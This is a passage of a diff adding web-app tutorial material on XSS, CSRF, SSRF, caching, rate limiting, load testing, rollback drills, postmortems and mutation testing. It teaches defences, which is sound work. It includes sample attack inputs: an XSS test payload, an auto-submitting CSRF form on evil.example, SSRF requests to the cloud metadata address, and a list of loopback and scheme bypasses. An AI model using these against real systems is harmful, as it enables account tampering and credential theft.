+Sanitise then modify: sanitising HTML and then running a string replace on it (to add links, say) can
+reassemble a dangerous tag from safe pieces. Sanitise last, right before insertion. Double decoding: input
+encoded twice passes a filter after one decode and becomes live after the second. Validate and encode at
+one well-defined point.
+
+</Level>
+
+<Level name="Production level">
+
+CSP starts in report-only mode, sending violation reports to an endpoint, so I can find legitimate inline
+scripts before enforcing. A lint rule flags `innerHTML`, `outerHTML`, `insertAdjacentHTML` and
+`dangerouslySetInnerHTML` for review. Uploaded files are served from a separate domain or with
+`Content-Disposition: attachment`.
+
+</Level>
+
+<Level name="Mindset">
+
+Data and code must never mix by accident. Every time a string crosses into HTML, a URL or a script, I ask
+which context it is entering and who wrote it.
+
+</Level>
+
+<Level name="System design">
+
+Isolation by origin is the strongest XSS control: user content on a sandbox domain, the app on its own, and
+cookies scoped tightly. Systems like email clients and code playgrounds rely on this.
+
+</Level>
+
+<Level name="Strategy">
+
+I search my code for every place that writes HTML, try a payload like `<img src=x onerror=alert(1)>` in every
+text field and URL parameter, fix each by encoding or sanitising, and add a CSP in report-only mode, then
+enforce it.
+
+Done when every payload in my test list renders as harmless text, a strict CSP is enforced with no violations
+from my own code, and the session cookie is `httpOnly`.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: CSRF, cross-site request forgery
+
+<Figure art={`
+  victim is logged in to app.example.com (cookie sid=abc)
+  victim visits evil.example while that cookie exists
+
+  evil page:  <form action="https://app.example.com/account/delete" method="POST">
+              ... auto-submits with JavaScript
+
+  browser sends POST /account/delete  + Cookie: sid=abc  (attached automatically)
+  server sees a valid session -> deletes the account
+
+  defences:  SameSite=Lax/Strict cookie   -> cookie not sent cross-site
+             CSRF token in form/header      -> evil page cannot read it
+             check Origin header            -> reject foreign origins
+`} caption="CSRF abuses the browser's habit of attaching cookies to every request to a site, no matter which page started it." />
+
+<Levels label="Phase 4, CSRF">
+
+<Level name="Beginner">
+
+When a site uses cookies for login, the browser attaches those cookies to every request to that site,
+even if a different site caused the request. Cross-site request forgery uses that: a malicious page makes
+the victim's browser send a state-changing request (transfer, delete, change email) to my app, and my app
+sees a valid session.
+
+The attacker cannot read the response (the same-origin policy prevents that), but they do not need to; the
+damage is the side effect. Mistake: thinking "my API only accepts JSON, so a form cannot hit it". A form can
+send `text/plain` bodies, and many servers parse more types than intended.
+
+</Level>
+
+<Level name="Intermediate">
+
+The modern first defence is the `SameSite` cookie attribute. `SameSite=Lax` (the default in current
+browsers when unset, though I set it explicitly) stops cookies being sent on cross-site POST requests while
+allowing top-level GET navigation, so links into my app still arrive logged in. `Strict` blocks even that.
+
+```ts
+res.cookie('sid', sessionId, { httpOnly: true, secure: true, sameSite: 'lax', path: '/', maxAge: 1000 * 60 * 60 * 8 });
+```
+
+Because `Lax` still sends cookies on top-level GETs, GET requests must never change state. A `GET /notes/42/delete`
+link is CSRF-able by an image tag.
+
+</Level>
+
+<Level name="Advanced">
+
+Defence in depth adds a CSRF token or an origin check. The synchroniser token pattern puts a random token in
+the session and in each form (or a custom header for fetch); the server rejects requests where they do not
+match, and an attacker's page cannot read the token. The double-submit pattern puts the token in a cookie and
+a header. Checking the `Origin` header (or `Sec-Fetch-Site: same-origin`) on state-changing requests is a
+simple, strong check for modern browsers.
+
+```ts
+app.use((req, res, next) => {
+  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
+    const origin = req.get('origin');
+    if (origin && origin !== 'https://app.example.com') return res.status(403).json({ error: 'bad origin' });
+  }
+  next();
+});
+```
+
+APIs authenticated by a bearer token in an `Authorization` header are not vulnerable to classic CSRF, because
+browsers do not attach that header automatically; they trade that for the token being readable by any XSS.
+
+</Level>
+
+<Level name="Edge cases">
+
+"Same site" is not "same origin": `evil.example.com` and `app.example.com` are the same site, so `SameSite`
+does not protect against a compromised or user-controlled subdomain. A login form can be CSRF'd too (login
+CSRF logs the victim into the attacker's account), so the login endpoint needs the origin check as well.
+
+</Level>
+
+<Level name="Corner cases">
+
+A permissive CORS config plus cookies: `Access-Control-Allow-Origin` reflecting any origin together with
+`Access-Control-Allow-Credentials: true` lets any site read authenticated responses, which turns CSRF's
+blind write into a full read. CORS must allowlist exact origins when credentials are allowed. Method
+override middleware (`_method=DELETE` in a form) turns a cross-site POST into a DELETE the server trusts.
+
+</Level>
+
+<Level name="Production level">
+
+Session cookies are `httpOnly; Secure; SameSite=Lax` at minimum, state-changing routes check origin or a
+token, and an integration test sends a POST with a foreign `Origin` header and asserts a 403.
+
+</Level>
+
+<Level name="Mindset">
+
+Ambient authority is dangerous. Anything the browser sends automatically, cookies most of all, can be sent
+on someone else's behalf.
+
+</Level>
+
+<Level name="System design">
+
+The choice between cookie sessions and header tokens is a trade between CSRF and XSS exposure. Cookie
+sessions with SameSite and origin checks, plus a strict CSP, is the common robust combination for a
+browser app on one domain.
+
+</Level>
+
+<Level name="Strategy">
+
+I build a tiny attacker page on another origin that auto-submits a form to my app, confirm whether it works,
+then add SameSite, the origin check and the test.
+
+Done when the attacker page fails with a 403 for every state-changing route, no GET route changes state, and
+the CORS config allows only my own origins with credentials.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: SSRF, server-side request forgery
+
+<Flow
+  caption="An SSRF attack against an 'import image from URL' feature, and the check that stops it"
+  steps={['User submits a URL', 'Server fetches it (from inside my network)', 'URL is http://169.254.169.254/latest/meta-data/', 'Cloud metadata returns credentials', 'Fix: resolve DNS, block private ranges, allowlist, no redirects']}
+/>
+
+<Levels label="Phase 4, SSRF">
+
+<Level name="Beginner">
+
+Server-side request forgery happens when my server fetches a URL that a user supplied, and the user points
+it somewhere only my server can reach: `localhost`, an internal admin service, a database port, or the
+cloud metadata address `169.254.169.254` that hands out credentials. Features that invite it: "import from
+URL", link previews, webhooks, PDF renderers that load remote images.
+
+```ts
+// vulnerable
+app.post('/avatar/from-url', async (req, res) => {
+  const img = await fetch(req.body.url);      // any URL, fetched from inside my network
+  ...
+});
+```
+
+Mistake: blocking the string `localhost`. Attackers use `127.0.0.1`, `0.0.0.0`, `[::1]`, decimal IPs like
+`2130706433`, or a DNS name that resolves to an internal address.
+
+</Level>
+
+<Level name="Intermediate">
+
+The robust check validates the destination, not the text. Parse the URL, allow only `https:` (and maybe
+`http:`), resolve the hostname to IP addresses, and reject any private, loopback, link-local or reserved
+range. Then connect to that resolved IP, not the name again.
+
+```ts
+import { lookup } from 'node:dns/promises';
+import ipaddr from 'ipaddr.js';
+
+async function assertPublicUrl(raw: string) {
+  const url = new URL(raw);
+  if (url.protocol !== 'https:') throw new Error('https only');
+  const addrs = await lookup(url.hostname, { all: true });
+  for (const { address } of addrs) {
+    const range = ipaddr.parse(address).range();
+    if (range !== 'unicast') throw new Error(`blocked range: ${range}`);
+  }
+  return { url, addrs };
+}
+```
+
+An allowlist of known hosts (only my image CDN, only GitHub) is stronger than any blocklist when the
+feature permits it.
+
+</Level>
+
+<Level name="Advanced">
+
+DNS rebinding defeats a check-then-fetch: the name resolves to a public IP when I check and to `127.0.0.1`
+a second later when `fetch` resolves it again. The fix is to pin the resolved address for the actual connection
+(a custom agent or `lookup` function), or route all outbound fetches through an egress proxy that enforces the
+rules. Redirects defeat checks too: a public URL that returns `302 Location: http://169.254.169.254/` must
+not be followed blindly; set `redirect: 'manual'` and validate each hop.
+
+Cloud providers added IMDSv2 (a token-required metadata service) partly because SSRF to metadata was so
+common. Enabling it is defence in depth, not a replacement for validation.
+
+</Level>
+
+<Level name="Edge cases">
+
+IPv6 forms (`::ffff:127.0.0.1`, an IPv4-mapped address) bypass IPv4-only checks. URLs with credentials
+(`https://user@internal`) and odd ports (`:6379` for Redis) need rules. A huge response or a slow drip
+response ties up my server; set size limits and timeouts on every outbound fetch.
+
+</Level>
+
+<Level name="Corner cases">
+
+SSRF plus a non-HTTP protocol: a fetcher library that supports `file://` or `gopher://` can read local files
+or speak to Redis directly. Only allow the schemes I need. SSRF plus an image processor: the fetched "image"
+is an SVG or a PDF that itself references internal URLs, which the renderer fetches on the server. Disable
+remote resource loading in renderers.
+
+</Level>
+
+<Level name="Production level">
+
+All user-directed outbound requests go through one wrapped function (or an egress proxy) with the checks,
+timeouts and size limits, and a lint rule forbids raw `fetch` in those features. Integration tests try the
+standard bypass list: loopback forms, metadata IP, IPv6-mapped, redirect to internal, rebinding.
+
+</Level>
+
+<Level name="Mindset">
+
+My server is inside the fence; whatever it fetches, it fetches with inside privileges. A user-supplied URL is a
+request to borrow that position.
+
+</Level>
+
+<Level name="System design">
+
+Network segmentation limits SSRF damage: the web tier cannot reach the database admin port or metadata, and
+outbound traffic leaves through a proxy with an allowlist. Webhook senders run in an isolated worker.
+
+</Level>
+
+<Level name="Strategy">
+
+I add an "avatar from URL" feature on purpose, attack it with the bypass list, then implement the validator,
+pinned resolution, redirect handling, limits and the tests.
+
+Done when every bypass in my list is rejected by a test, outbound fetches have timeouts and size limits, and
+only `https:` to public addresses is allowed.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Caching
+
+<Layers
+  caption="The caches a single request can pass through, from closest to the user to closest to the data"
+  layers={[
+    { name: 'Browser cache', note: 'Cache-Control on static assets: hashed files cached for a year' },
+    { name: 'CDN / edge cache', note: 'public pages and assets, near the user' },
+    { name: 'Application memory', note: 'a small LRU for hot, cheap-to-stale values' },
+    { name: 'Shared cache (Redis)', note: 'computed results shared by every server instance' },
+    { name: 'Database buffer cache', note: 'Postgres keeps hot pages in memory itself' },
+    { name: 'The source of truth', note: 'the row on disk' },
+  ]}
+/>
+
+<Levels label="Phase 4, caching">
+
+<Level name="Beginner">
+
+A cache stores the result of expensive work so the next request can reuse it. The easiest and most
+valuable cache is the browser's, controlled by the `Cache-Control` header. Build tools give static files
+content-hashed names (`index-3f9a2c.js`), so the file at that name never changes and can be cached forever,
+while the HTML that references it is revalidated every time.
+
+```text
+GET /assets/index-3f9a2c.js
+Cache-Control: public, max-age=31536000, immutable
+
+GET /index.html
+Cache-Control: no-cache          (store it, but ask the server before using it)
+```
+
+Mistake: caching the HTML for a day. Users then load yesterday's HTML pointing at files a new deploy
+removed, and see a blank page.
+
+</Level>
+
+<Level name="Intermediate">
+
+For computed data, the common pattern is cache-aside: look in the cache; on a miss, compute from the database,
+store with an expiry, and return.
+
+```ts
+async function getStats(userId: string) {
+  const key = `stats:v1:${userId}`;
+  const hit = await redis.get(key);
+  if (hit) return JSON.parse(hit);
+  const stats = await computeStatsFromDb(userId);          // 400 ms
+  await redis.set(key, JSON.stringify(stats), 'EX', 60);    // fresh for 60 s
+  return stats;
+}
+```
+
+The questions every cache must answer: what is the key, how long is it valid (TTL), and what invalidates it
+early? For stats, sixty seconds stale is fine. For a user's own note after they edit it, stale is a bug, so
+the write path deletes the key.
+
+</Level>
+
+<Level name="Advanced">
+
+HTTP revalidation avoids re-sending unchanged data: the server sends an `ETag` (a version tag); the browser
+sends it back as `If-None-Match`; if unchanged, the server answers `304 Not Modified` with no body.
+`stale-while-revalidate` lets a cache serve a slightly stale response instantly while fetching a fresh one in
+the background.
+
+Invalidation strategies: TTL only (simple, bounded staleness), delete on write (fresh, but every write path
+must remember), versioned keys (bump `v1` to `v2` to invalidate everything), and event-driven invalidation.
+Each trades complexity against staleness.
+
+</Level>
+
+<Level name="Edge cases">
+
+Caching a "not found" or an error: without negative caching, a missing key is recomputed on every request;
+with careless negative caching, a record created a second later is reported missing for a minute. Caching
+responses that vary by user without a per-user key, or without `Cache-Control: private`, serves one user's
+data to another through a shared cache.
+
+</Level>
+
+<Level name="Corner cases">
+
+The thundering herd: a popular key expires and a thousand concurrent requests all miss at once and hit the
+database together. Fixes: a lock so one request recomputes while others wait or get stale data, and jittered
+TTLs so keys do not expire together. A write plus a concurrent read: the reader misses, reads the old row,
+the writer updates and deletes the key, then the reader stores the old value, which now lives for the full TTL.
+Short TTLs bound the damage; versioned values prevent it.
+
+</Level>
+
+<Level name="Production level">
+
+A cache has metrics: hit rate, latency, memory, evictions. The app must work, slower, if the cache is down;
+a cache outage that takes the site down means the cache became a database without being treated as one.
+Personal data in shared caches has retention rules like any store.
+
+</Level>
+
+<Level name="Mindset">
+
+Cache last, after measuring. A cache hides slowness instead of removing it and adds a second source of truth
+that can disagree with the first.
+
+</Level>
+
+<Level name="System design">
+
+Caching is a consistency decision: which reads may be stale, by how much, for whom. Writing that down per
+data type (public pages: minutes, user's own data: never, stats: a minute) makes the design reviewable.
+
+</Level>
+
+<Level name="Strategy">
+
+Set correct `Cache-Control` for assets and HTML first, measure the slowest endpoint, add cache-aside with a
+TTL and invalidation on write, and write a test proving an edit is visible immediately.
+
+Done when hashed assets are cached for a year and HTML is revalidated, one endpoint's p95 dropped measurably
+with a cache, the hit rate is on a dashboard, and the app still works with the cache stopped.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Rate limiting
+
+<Figure art={`
+  token bucket, capacity 5, refill 1 token / 12 s  (= 5 per minute)
+
+  time  0s  [#####]  5 logins attempted quickly -> all allowed
+        1s  [     ]  6th attempt -> 429 Too Many Requests, Retry-After: 11
+       12s  [#    ]  one token back -> one more attempt allowed
+       60s  [#####]  bucket full again
+
+  key = route + IP  for anonymous;  route + userId  for logged in
+`} caption="A token bucket allows short bursts but caps the average rate; each key gets its own bucket." />
+
+<Levels label="Phase 4, rate limiting">
+
+<Level name="Beginner">
+
+Rate limiting caps how many requests a client can make in a time window. It protects login from password
+guessing, expensive endpoints from overload, and my AI or email bill from abuse. The response when the limit is
+hit is `429 Too Many Requests`, ideally with a `Retry-After` header.
+
+```ts
+import rateLimit from 'express-rate-limit';
+app.use('/auth/login', rateLimit({ windowMs: 60_000, limit: 5, standardHeaders: 'draft-7', legacyHeaders: false }));
+```
+
+```text
+HTTP/1.1 429 Too Many Requests
+RateLimit: limit=5, remaining=0, reset=48
+Retry-After: 48
+```
+
+Mistake: one global limit for the whole API. Normal page loads use it up, and login still allows thousands of
+guesses spread out. Limits are per route and per purpose.
+
+</Level>
+
+<Level name="Intermediate">
+
+Algorithms differ in fairness. A fixed window (5 per calendar minute) allows 10 in two seconds around the
+minute boundary. A sliding window counts the last 60 seconds. A token bucket allows a burst up to capacity and
+then a steady rate. Choose by what the limit protects: login wants strict per-account and per-IP limits;
+search wants a burst-friendly bucket.
+
+Keying matters. Anonymous requests are keyed by IP; logged-in requests by user ID; login attempts by both
+the IP and the target account, so an attacker rotating IPs against one account still hits a limit.
+
+</Level>
+
+<Level name="Advanced">
+
+With more than one server instance, in-memory counters let a client get N times the limit by spreading
+requests. The store must be shared, usually Redis with an atomic increment and expiry (or a Lua script for a
+token bucket), so the check and the update cannot interleave.
+
+```ts
+const count = await redis.incr(key);
+if (count === 1) await redis.expire(key, 60);
+if (count > 5) return res.status(429).set('Retry-After', '60').end();
+```
+
+Behind a proxy or CDN, the client IP is in `X-Forwarded-For`; Express needs `app.set('trust proxy', 1)`
+(exactly the number of proxies I control), or every request appears to come from the proxy and one limit is
+shared by everyone.
+
+</Level>
+
+<Level name="Edge cases">
+
+Users behind one corporate or mobile carrier NAT share an IP, so an IP limit can block a whole office; combine
+with per-account limits and keep IP limits generous outside login. Trusting `X-Forwarded-For` without a proxy
+lets an attacker set any IP per request and bypass the limit entirely.
+
+</Level>
+
+<Level name="Corner cases">
+
+The `count === 1` then `expire` pattern above has a gap: if the process dies between `incr` and `expire`, the
+key never expires and that client is blocked forever. Use `SET key 0 EX 60 NX` then `INCR`, or a single Lua
+script. Rate limiting plus retries: a client library that retries on 429 without honouring `Retry-After`
+turns a limit into a retry storm. My own clients use exponential backoff with jitter.
+
+</Level>
+
+<Level name="Production level">
+
+Limits are configured per endpoint, logged when hit (without personal data), and visible on a dashboard so a
+real attack or a too-tight limit is noticed. Expensive endpoints also get cost limits (requests per day per
+user for AI calls) and global circuit breakers that degrade gracefully.
+
+</Level>
+
+<Level name="Mindset">
+
+Every endpoint is a resource someone else can spend. Ask what one client calling it a million times would cost
+me.
+
+</Level>
+
+<Level name="System design">
+
+Rate limits sit at several layers: the CDN or gateway for volumetric abuse, the app for per-user business
+rules, and quotas for paid tiers. Pushing coarse limits to the edge keeps junk traffic off the servers.
+
+</Level>
+
+<Level name="Strategy">
+
+Add limits to login, signup, password reset, upload and any expensive endpoint, backed by Redis, with `trust
+proxy` set correctly. Write tests that send N+1 requests and expect a 429 with `Retry-After`.
+
+Done when a scripted password-guessing run against one account is stopped within a handful of attempts, from one
+IP or many, and normal use never sees a 429.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: A load test that produces a number
+
+<Figure art={`
+  p95 latency
+  (ms)
+  1200 |                                        x   <- knee: queueing starts
+   900 |                                    x
+   600 |                               x
+   300 |  x    x    x    x    x    x
+     0 +---------------------------------------------
+       10   20   40   60   80  100  120  140  160   requests / second
+
+  capacity at a 300 ms p95 target: about 100 req/s on this setup
+`} caption="Latency stays flat until a resource saturates, then rises sharply. The number I report is the load at the knee." />
+
+<Levels label="Phase 4, a load test that produces a number">
+
+<Level name="Beginner">
+
+A load test sends many requests at the app to find out how much traffic it handles before it gets slow or
+starts failing. The plan's proof is "a load test has a number": not "it felt fast", but "the notes list
+handles 100 requests per second at a p95 under 300 ms on this instance size".
+
+```js
+// load.js, run with: k6 run load.js
+import http from 'k6/http';
+import { check } from 'k6';
+export const options = { vus: 50, duration: '1m' };
+export default function () {
+  const res = http.get('https://staging.example.com/api/notes', { headers: { Cookie: __ENV.COOKIE } });
+  check(res, { 'status 200': (r) => r.status === 200 });
+}
+```
+
+Mistake: load testing production, or load testing from my laptop over Wi-Fi and measuring my own network.
+Run it against staging, from a machine close to it.
+
+</Level>
+
+<Level name="Intermediate">
+
+The output to read is the latency distribution and the error rate, not the average.
+
+```text
+http_req_duration..........: avg=88ms  med=61ms  p(90)=170ms  p(95)=240ms  max=1.9s
+http_req_failed............: 0.12%  ✓ 7  ✗ 5893
+http_reqs..................: 5900   98.2/s
+```
+
+Thresholds turn the test into a pass or fail check: `thresholds: { http_req_duration: ['p(95)<300'],
+http_req_failed: ['rate<0.01'] }`. A ramping profile (stages from 10 to 200 virtual users) finds the knee, the
+point where latency starts climbing.
+
+</Level>
+
+<Level name="Advanced">
+
+The knee appears when something saturates: CPU on the Node process (one event loop per process), the database
+connection pool (requests queue waiting for a connection), the database itself, or memory. While the test runs I
+watch the app's metrics and traces to see which one. Little's law connects the numbers: concurrent requests in
+the system equal arrival rate times time in system, so if a pool has 10 connections and each query holds one for
+50 ms, the pool tops out near 200 queries per second, whatever the CPU says.
+
+</Level>
+
+<Level name="Edge cases">
+
+A test that always fetches the same note measures the cache, not the system; use varied IDs and users. A test
+with no think time models clients hammering in a loop, not humans; open-model tools (constant arrival rate)
+avoid the coordinated-omission trap where a slow server makes the test send fewer requests and hide the slowness.
+
+</Level>
+
+<Level name="Corner cases">
+
+Rate limits plus a load test from one IP: the test hits my own 429s and reports a fake ceiling. Use a test
+bypass on staging or several source IPs, and report both numbers. Autoscaling plus a short test: the test ends
+before new instances start, so it measures one instance under overload, not the scaled system.
+
+</Level>
+
+<Level name="Production level">
+
+Load tests run before launches and after big changes, against staging sized like production, with the same
+database volume. The result goes into the runbook: expected capacity, the first resource to saturate, and what
+to do (scale out, raise the pool, cache).
+
+</Level>
+
+<Level name="Mindset">
+
+Capacity is a measured fact with a date and a setup, not a belief. Rerun it when the setup changes.
+
+</Level>
+
+<Level name="System design">
+
+The saturating resource tells me where architecture changes would pay: more app instances if CPU-bound,
+read replicas or caching if database-bound, queues if work can be deferred.
+
+</Level>
+
+<Level name="Strategy">
+
+Write a k6 script for the main read and write endpoints, ramp until the knee, watch metrics to name the
+bottleneck, fix one thing, and rerun.
+
+Done when I have a written number (rate at a p95 target, with error rate and setup), the name of the resource
+that saturates first, and a before-and-after for one fix.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: A runbook, a deliberate failure and a rollback
+
+<Flow
+  caption="The rollback drill: practise recovery while nothing is on fire"
+  steps={['Deploy a deliberate bug to staging', 'Alert fires or smoke test fails', 'Open the runbook', 'Decide: roll back, do not debug live', 'Redeploy the last good SHA', 'Verify with the smoke test', 'Write down how long each step took']}
+/>
+
+<Levels label="Phase 4, a runbook, a deliberate failure and a rollback">
+
+<Level name="Beginner">
+
+A runbook is a short document that tells whoever is on call how to operate the app: where it runs, how to
+deploy, how to roll back, where the logs and dashboards are, and what to do for each alert. It is written for
+a tired person at 2am, so it uses exact commands, not explanations.
+
+```md
+## Roll back the API
+1. Find the last good release: GitHub, Actions, deploy workflow, last green run before the incident.
+2. Re-run that run's deploy job, or: `./scripts/deploy.sh <sha>`.
+3. Verify: `curl -fsS https://api.example.com/health` returns `{"ok":true,"sha":"<sha>"}`.
+4. Post in #status: what broke, that it is rolled back, next update in 30 minutes.
+```
+
+Mistake: a runbook nobody has ever followed. Commands in it go stale silently; the only way to know it works is
+to run it.
+
+</Level>
+
+<Level name="Intermediate">
+
+The plan asks me to introduce one deliberate failure and practise the rollback. I pick a realistic bug: a
+change that makes the notes endpoint throw for users with zero notes. I deploy it to staging (or production
+behind a flag, if I trust my tools), and observe: does an alert fire, does the smoke test fail, how long until I
+notice? Then I follow the runbook exactly, timing each step.
+
+The health endpoint should report the running commit SHA, so verification is unambiguous:
+
+```ts
+app.get('/health', async (_req, res) => {
+  await db.query('select 1');
+  res.json({ ok: true, sha: process.env.GIT_SHA });
+});
+```
+
+</Level>
+
+<Level name="Advanced">
+
+Rollback is only easy if deploys are immutable and database changes are backward compatible. If release N
+drops a column that release N-1 reads, rolling the code back breaks it. The expand-and-contract pattern makes
+schema changes safe: add the new column (expand), deploy code that writes both and reads the new one, backfill,
+and only in a later release remove the old column (contract). Each step can be rolled back independently.
+
+Feature flags give a faster rollback than a deploy: turning a flag off disables the new path in seconds without
+building anything.
+
+</Level>
+
+<Level name="Edge cases">
+
+The first deploy ever has nothing to roll back to. A rollback when the bad release already wrote bad data does
+not fix the data; the runbook needs a data repair section. A rollback that requires credentials only one person
+has fails when that person is asleep.
+
+</Level>
+
+<Level name="Corner cases">
+
+A rollback plus a migration that already ran: the old code meets the new schema. If the migration was additive,
+fine; if destructive, the rollback fails or corrupts. This is why destructive migrations wait a release. A
+rollback plus a cache full of entries in the new format: the old code cannot parse them. Version cache keys so
+each release reads its own.
+
+</Level>
+
+<Level name="Production level">
+
+Teams time their mean time to recovery and practise it. A good target for a small app is a rollback in under
+five minutes from decision to verified. Deploy pipelines keep the last few artefacts ready, and "roll back
+first, debug second" is the default during an incident.
+
+</Level>
+
+<Level name="Mindset">
+
+Recovery speed matters more than never failing. Failure will happen; a practised rollback turns it into a small
+event.
+
+</Level>
+
+<Level name="System design">
+
+Design every change to be reversible: immutable artefacts, backward-compatible migrations, flags for risky
+paths, and config separated from code. Reversibility is what makes frequent deploys safe.
+
+</Level>
+
+<Level name="Strategy">
+
+I write the runbook, add the SHA to the health endpoint, deploy the deliberate bug, roll back by following the
+runbook word for word, and fix every step that was wrong in the runbook itself.
+
+Done when a person who has never seen the app could roll it back using only the runbook, and my drill took under
+five minutes from alert to verified rollback.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: A postmortem for one real failure
+
+<Timeline
+  caption="A blameless postmortem's timeline section, for the deliberate failure drill"
+  items={[
+    { when: '14:02', what: 'Release 3f9a deployed to staging. Notes list throws for users with zero notes.' },
+    { when: '14:05', what: 'Smoke test fails; error tracker opens a new issue tagged with release 3f9a.' },
+    { when: '14:07', what: 'Decision: roll back. Runbook step 2 command had the wrong script name.' },
+    { when: '14:11', what: 'Rollback to 8c21 verified by the health endpoint SHA and the smoke test.' },
+    { when: '14:40', what: 'Fix merged with a test for the zero-notes case; runbook corrected.' },
+  ]}
+/>
+
+<Levels label="Phase 4, a postmortem for one real failure">
+
+<Level name="Beginner">
+
+A postmortem is a written account of a failure: what happened, the impact, the timeline, the cause, and what
+will change so it does not happen again. "Blameless" means it looks for causes in the system (missing test,
+confusing runbook, unsafe default), not in a person's mistake, because people make mistakes and systems should
+catch them.
+
+The structure I use: summary (two sentences), impact (who, how long), timeline, root cause and contributing
+factors, what went well, what went badly, and action items with owners and dates.
+
+Mistake: an action item like "be more careful". It cannot be checked or completed. Action items are concrete:
+"add a test for users with zero notes", "fix the runbook command".
+
+</Level>
+
+<Level name="Intermediate">
+
+Finding the cause uses "five whys", asked of the system. Why did the list throw? It called `.reduce` on an empty
+array with no initial value. Why was it not caught? No test had a user with zero notes. Why not? The factory
+always created three notes. Why did it reach staging? The integration tests use the same factory. That chain
+gives two fixes: the code, and the factory default.
+
+```text
+TypeError: Reduce of empty array with no initial value
+    at summarise (src/notes/summary.ts:12:24)
+```
+
+</Level>
+
+<Level name="Advanced">
+
+Real failures rarely have one root cause; they have contributing factors that lined up (the Swiss cheese
+model). The postmortem names each layer that could have stopped it: the type system (could a non-empty array
+type have caught it?), the tests, review, the canary, the alert, the runbook. Each is a possible action item;
+I pick the cheapest ones that close the most holes.
+
+</Level>
+
+<Level name="Edge cases">
+
+A near miss (caught in staging) deserves a short postmortem too; it is the cheapest lesson available. A failure
+with no user impact still has a timeline worth recording, because detection time is a number to improve.
+
+</Level>
+
+<Level name="Corner cases">
+
+A postmortem whose action items are never done is worse than none, because it creates false confidence. Track
+them like bugs, with dates, and review them. A postmortem that blames a third party ("the provider was down")
+still has an action item on my side: a timeout, a fallback, a status message.
+
+</Level>
+
+<Level name="Production level">
+
+Postmortems are shared, searchable, and reviewed in a regular meeting; repeated causes across postmortems become
+engineering priorities. Severity levels decide which incidents need a full write-up.
+
+</Level>
+
+<Level name="Mindset">
+
+A failure is data. The goal is to make the next one less likely and less costly, not to find someone to blame.
+
+</Level>
+
+<Level name="System design">
+
+Postmortems feed architecture: recurring classes of incident (bad migrations, retry storms, missing limits)
+justify design changes, such as an expand-and-contract policy or a shared outbound client.
+
+</Level>
+
+<Level name="Strategy">
+
+I write the postmortem for my deliberate failure drill and for one real bug from this phase, using the
+template, and complete every action item.
+
+Done when both postmortems are in the repository, every action item links to a merged PR, and a reader can see
+how long detection and recovery took.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: Mutation testing, the traps and the AI-era note
+
+<Compare
+  left="A test that asserts nothing useful"
+  right="A test that kills mutants"
+  caption="AI-written tests often look like the left column. Mutation testing finds them by changing the code and seeing whether any test notices."
+  rows={[
+    ['expect(result).toBeDefined()', 'expect(result).toEqual({ total: 30, count: 2 })'],
+    ['Calls the function, checks no throw', 'Checks the exact output for boundary inputs'],
+    ['Mocks the function under test', 'Mocks only the outside world'],
+    ['100% line coverage, mutants survive', 'Lower coverage, mutants killed'],
+  ]}
+/>
+
+<Levels label="Phase 4, mutation testing, the traps and the AI-era note">
+
+<Level name="Beginner">
+
+Coverage says which lines ran during tests, not whether any test would fail if those lines were wrong. Mutation
+testing checks that. A tool such as Stryker makes small changes (mutants) to my code: `>` becomes `>=`, `+`
+becomes `-`, a condition becomes `true`, a return value becomes empty. Then it runs the tests. If a test fails, the
+mutant is killed. If all tests still pass, the mutant survived, and I have a line that no test really checks.
+
+```sh
+$ npx stryker run
+Mutation score: 71.4%
+Survived: src/pricing.ts:18  ConditionalExpression  if (qty > 10) -> if (qty >= 10)
+```
+
+That surviving mutant says: nothing tests a quantity of exactly 10.
+
+</Level>
+
+<Level name="Intermediate">
+
+The plan's traps for this phase are coverage theatre, testing implementation details, no staging
+environment, alert fatigue, and treating security as a later ticket. Coverage theatre is the first one
+mutation testing exposes: a suite at 95% coverage with a 40% mutation score is mostly decoration. Implementation-detail
+tests show up the other way: they break when I refactor without changing behaviour.
+
+The AI-era note: AI writes tests quickly. My job is to judge whether they test behaviour or implementation.
+I ask a model for tests, then run Stryker on the module, and keep only the tests that kill mutants, rewriting
+the rest.
+
+</Level>
+
+<Level name="Advanced">
+
+Mutation testing is slow because it runs the suite once per mutant, so it is run per module or on changed files
+(Stryker's incremental mode), not on every push. Equivalent mutants, changes that do not alter behaviour, cannot be
+killed and should be ignored, not chased. A score target per critical module (pricing, permissions) is more useful
+than a global number.
+
+</Level>
+
+<Level name="Edge cases">
+
+A surviving mutant in logging or a debug message is usually fine. A surviving mutant in an authorization check
+is a security hole without a test, and goes straight to the top of the list.
+
+</Level>
+
+<Level name="Corner cases">
+
+A test suite with a high mutation score but mocks everywhere: the mutants are killed by assertions on mock calls,
+so the tests are tightly coupled to implementation. Both signals matter: kill mutants with assertions on
+observable behaviour.
+
+</Level>
+
+<Level name="Production level">
+
+Staging exists and mirrors production (same build, same migrations, realistic data), so deploys and drills happen
+there first. Alerts are few and actionable. Security items are part of each feature's definition of done.
+
+</Level>
+
+<Level name="Mindset">
+
+A test is a claim that the code is right. Mutation testing checks the claim. I trust evidence, including evidence
+about my evidence.
+
+</Level>
+
+<Level name="System design">
+
+Quality signals form a system: types, tests, mutation score, review, monitoring. Each covers holes in the others,
+and none is enough alone.
+
+</Level>
+
+<Level name="Strategy">
+
+Run Stryker on my two most critical modules, write tests until the score is high, and compare with coverage. Then
+audit AI-generated tests by the same measure.
+
+Done when the critical modules have a mutation score above my chosen target, I can point to a mutant that revealed a
+real missing test, and every trap in the plan has a matching habit in my workflow.
+
+</Level>
+
+</Levels>
+
+#### Phase 4: The security checklist, signed off
+
+<Compare
+  left="Checklist item (from the plan)"
+  right="How I prove it in my app"
+  caption="The plan's minimum security checklist, each item paired with evidence that can be checked."
+  rows={[
+    ['Validate on the server, always', 'Zod schema on every route; test sends bad input with curl, gets 400'],
+    ['Hash passwords with argon2 or bcrypt', 'Users table has argon2 hashes; test checks no plain text stored'],
+    ['httpOnly, secure cookies; short-lived tokens', 'Set-Cookie flags asserted in an integration test'],
+    ['Authorization on every record', 'Second-user test per route returns 404'],
+    ['Secrets in env, never in Git', 'gitleaks in CI; .env ignored'],
